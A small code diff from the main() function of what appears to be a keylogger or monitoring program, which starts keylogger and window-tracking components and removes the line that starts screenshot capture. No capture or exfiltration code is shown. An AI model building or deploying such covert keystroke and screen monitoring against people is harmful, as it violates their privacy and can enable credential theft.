@@ -13,7 +13,6 @@ def main():
     screenshot = Screenshot()
     windowTracker = WindowTracker(screenshot,fileHandler)
     keylogger.start()
-    screenshot.start()
     windowTracker.start()
     
     
